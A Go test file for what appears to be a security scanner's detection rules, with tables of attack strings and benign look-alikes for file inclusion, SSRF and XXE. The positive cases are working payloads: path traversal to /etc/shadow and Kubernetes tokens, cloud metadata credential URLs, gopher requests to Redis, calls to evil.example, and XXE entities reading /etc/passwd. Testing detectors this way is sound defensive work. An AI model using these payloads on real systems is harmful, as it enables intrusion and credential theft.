package detect

import (
	"testing"

	"github.com/ergasterion-dev/aegolith/internal/model"
)

// Positive and negative tables, package-level so that ScanText's tests
// (scan_test.go) can run every one of them through the combined scan.
var (
	lfiTraversalPositives = []string{
		"../../../../etc/shadow",
		"../../etc/passwd%00.png",
		"../../../var/run/secrets/kubernetes.io/serviceaccount/token",
		// Beyond the brief.
		"..\\..\\windows\\win.ini",
		"..%5c..%5c..%5cwindows%5cwin.ini",
		"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"%252e%252e%252f%252e%252e%252fetc%252fpasswd",
		"..%2f..%2fapp.yaml",
		"files/../../config",
		"report.pdf%00",
		"a\x00.png",
		"/static/..",
	}
	lfiFilePositives = []string{
		"/etc/passwd",
		"/ETC/SHADOW",
		"/proc/self/environ",
		"/var/run/secrets/kubernetes.io/serviceaccount/token",
		"C:\\Windows\\win.ini",
		"c:/boot.ini",
		"%2Fetc%2Fpasswd",
	}
	lfiNegatives = []string{
		"Wait.../ok",
		"yes.../no",
		"and so on..",
		"1/2 kg",
		"and/or",
		"v1.2.3/notes",
		"Flat 3B, Rajbagh",
		"see etc/passwords policy",
		"windows win.ini guide",
		"100% cotton",
	}
	rfiPositives = []string{
		"http://evil.example/shell.txt?",
		"php://filter/convert.base64-encode/resource=index.php",
		"file:///etc/passwd",
		"gopher://127.0.0.1:6379/_FLUSHALL",
		// Beyond the brief.
		"  FILE:/etc/hosts",
		"dict://127.0.0.1:11211/stat",
		"ldap://evil.example/a",
		"jar:http://evil.example/x.jar!/",
		"expect://id",
		"data:text/html;base64,PHNjcmlwdD4=",
		"data:text/html,<script>alert(1)</script>",
		"https://evil.example/x.txt?",
		"file%3A%2F%2F%2Fetc%2Fpasswd",
	}
	rfiNegatives = []string{
		"File: invoice.pdf",
		"Dict: a word list",
		"LDAP: is it supported?",
		"jar: pickles",
		"Expect: delay",
		"PHP: not used",
		"https://example.com/review/123",
		"https://example.com/search?q=milk",
		"Is this fresh?",
		"data: none",
	}
	ssrfMetadataPositives = []string{
		"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		// Beyond the brief.
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://[fd00:ec2::254]/latest/meta-data/",
		"http://100.100.100.200/latest/meta-data/",
		"HTTP://user:pw@169.254.169.254:80/",
		"http://metadata.google.internal./",
		"http%3A%2F%2F169.254.169.254%2F",
	}
	ssrfPrivatePositives = []string{
		"http://127.0.0.1:8080/admin",
		"gopher://127.0.0.1:6379/_FLUSHALL",
		// Beyond the brief.
		"http://localhost/admin",
		"http://LOCALHOST:9000",
		"http://api.localhost/",
		"https://10.0.0.5/internal",
		"http://172.16.0.1/",
		"http://172.31.255.255/",
		"http://192.168.1.1/",
		"http://169.254.10.1/",
		"http://[::1]:8080/",
		"http://[::ffff:127.0.0.1]/",
		"http://[fe80::1]/",
		"http://127.1/",
		"http://2130706433/",
		"http://0x7f000001/",
		"http://0177.0.0.1/",
		"http://0.0.0.0:8080/",
		"see http://127.0.0.1/x for details",
	}
	ssrfNegatives = []string{
		"router at 192.168.1.1",
		"My router is 192.168.1.1, please call",
		"https://example.com/review/123",
		"http://172.32.0.1/",
		"http://11.0.0.1/",
		"https://8.8.8.8/",
		"http://192.169.1.1/",
		"Version 10.0.0.5 released",
		"http://localhost.example.com/",
		"http://example.com/?next=127.0.0.1",
	}
	xxePositives = []string{
		`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
		`<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://evil.example/evil.dtd"><r/>`,
		`<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;">]><l>&c;</l>`,
		// Beyond the brief.
		`<!doctype r PUBLIC "-//X//EN" "http://evil.example/x.dtd"><r/>`,
	}
	xxeNegatives = []string{
		`<?xml version="1.0"?><order><id>12</id></order>`,
		`<!DOCTYPE r><r>no entities here</r>`,
		`<order><note>SYSTEM PUBLIC ENTITY</note></order>`,
		"The DOCTYPE and the system are public",
	}
)

func TestLFI(t *testing.T) {
	assertHits(t, "LFI", LFI, Hit{RuleID: "AEG-LFI-001", Category: model.CatLFI, Severity: model.SeverityHigh}, lfiTraversalPositives)
	assertHits(t, "LFI", LFI, Hit{RuleID: "AEG-LFI-002", Category: model.CatLFI, Severity: model.SeverityHigh}, lfiFilePositives)
	assertNoHits(t, "LFI", LFI, lfiNegatives)
}

func TestRFI(t *testing.T) {
	assertHits(t, "RFI", RFI, Hit{RuleID: "AEG-RFI-001", Category: model.CatRFI, Severity: model.SeverityHigh}, rfiPositives)
	assertNoHits(t, "RFI", RFI, rfiNegatives)
}

func TestSSRF(t *testing.T) {
	assertHits(t, "SSRF", SSRF, Hit{RuleID: "AEG-SSRF-001", Category: model.CatSSRF, Severity: model.SeverityCritical}, ssrfMetadataPositives)
	assertHits(t, "SSRF", SSRF, Hit{RuleID: "AEG-SSRF-002", Category: model.CatSSRF, Severity: model.SeverityHigh}, ssrfPrivatePositives)
	assertNoHits(t, "SSRF", SSRF, ssrfNegatives)
}

func TestXXE(t *testing.T) {
	assertHits(t, "XXE", XXE, Hit{RuleID: "AEG-XXE-001", Category: model.CatXXE, Severity: model.SeverityHigh}, xxePositives)
	assertNoHits(t, "XXE", XXE, xxeNegatives)
}
